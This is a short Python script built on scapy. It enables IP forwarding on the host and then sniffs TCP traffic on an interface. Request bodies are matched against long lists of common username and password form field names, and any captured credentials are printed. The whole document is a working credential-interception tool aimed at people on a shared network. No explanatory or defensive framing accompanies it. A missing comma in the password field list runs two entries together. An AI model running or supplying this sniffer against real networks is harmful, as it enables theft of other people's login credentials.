from scapy.all import *
import re
from urllib import parse
import os 


iface = 'eth0'
os.system('echo 1 >> /proc/sys/net/ipv4/ip_forward')


def get_login(body):
    user = None
    passwd = None


    userfields = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                  'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                  'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                  'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']

    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
                  'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword',
                  'login_password'
                  'passwort', 'passwrd', 'wppassword', 'upasswd', 'senha', 'contrasena']


    for login in userfields:
        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
        if login_re:
            user = login_re.group()
    
    for passfield in passfields:
        pass_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)
        if pass_re:
            passwd = pass_re.group()
    if user and passwd:
        return(user, passwd)

    
def pkt_parser(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
        body = str(packet[TCP].payload)
        user_passwd = get_login(body)
        if user_passwd != None:
            print(packet[TCP])
            print(parse.unquote(user_passwd[0]))
            print(parse.unquote(user_passwd[1]))
    else:
        pass

    
try:
    sniff(iface=iface, prn=pkt_parser, store=0)
except KeyboardInterrupt:
    print('Cancelling...')
    exit(0)
